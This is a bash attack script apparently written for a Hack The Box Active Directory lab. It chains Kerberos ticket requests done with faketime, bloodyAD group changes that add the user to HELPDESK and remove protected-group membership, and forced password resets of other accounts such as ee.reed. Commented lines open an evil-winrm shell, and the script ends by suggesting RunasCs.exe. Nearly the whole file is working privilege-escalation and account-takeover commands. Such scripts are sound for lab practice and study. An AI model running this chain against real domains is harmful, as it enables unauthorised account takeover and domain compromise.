#!/bin/bash

DOMAIN="<name>.htb"
REALM="<NAME>.HTB"
DC_IP="10.10.XX.XX"
USER="username"
PASS="password"
USER2="username2"
PASS2="password2"

ntpdate -u $DC_IP
FAKETIME=$(date -d "+3 minutes" +"%Y-%m-%d %H:%M:%S")
echo "[---] Using faketime: $FAKETIME"

echo "[!] Getting TGT"
faketime "$FAKETIME" impacket-getTGT -dc-ip $DC_IP $REALM/$USER:$PASS

export KRB5CCNAME=$USER.ccache
klist
echo "[should have IT-COMPTER]"
# here you add the user at Helpdesk group
faketime "$FAKETIME" bloodyAD --host dc.$DOMAIN -d $DOMAIN -k add groupMember 'HELPDESK' $USER

faketime "$FAKETIME" impacket-getTGT $REALM/$USER:$PASS -dc-ip $DC_IP
export KRB5CCNAME=$USER.ccache
klist
sleep 3
echo "[Shoudl have again $USER]"

##################### FOR USER2 ######################
# you remove your account from protected staf so you can change it
#faketime "$FAKETIME" bloodyAD --host dc.$DOMAIN -k -d $DOMAIN -u 'username' -p 'password' remove groupMember 'Protected Objects' 'IT'

#faketime "$FAKETIME" bloodyAD --kerberos -d $DOMAIN -k --host dc.$DOMAIN -u $USER -p $PASS set password $USER2 $PASS2
#sleep 3

# morgan is the user2 but you need to put in with Capitals
#faketime "$FAKETIME" impacket-getTGT -dc-ip $DC_IP $REALM/BB.MORGAN:$PASS2
#export KRB5CCNAME=BB.MORGAN.ccache
#klist
#echo "[Should have $USER2]"
#sleep 3

#faketime "$FAKETIME" evil-winrm -i dc.$DOMAIN -r $REALM 

############################# FOR REED ####################
# you give Helpdesk prevs to your account
faketime "$FAKETIME" bloodyAD --host dc.$DOMAIN --dc-ip $DC_IP -d $DOMAIN -k add groupMember 'HELPDESK' $USER
# you remove your self from Support
faketime "$FAKETIME" bloodyAD --kerberos --dc-ip $DC_IP --host dc.$DOMAIN -d $DOMAIN -u $USER -p $PASS remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=<NAME>,DC=HTB" "SUPPORT"
# you change reeds password
faketime "$FAKETIME" bloodyAD --kerberos --host dc.$DOMAIN -d $DOMAIN -u $USER -p $PASS set password ee.reed 'Password123!'

echo "Now you can upload RunasCs.exe to usi this user!"
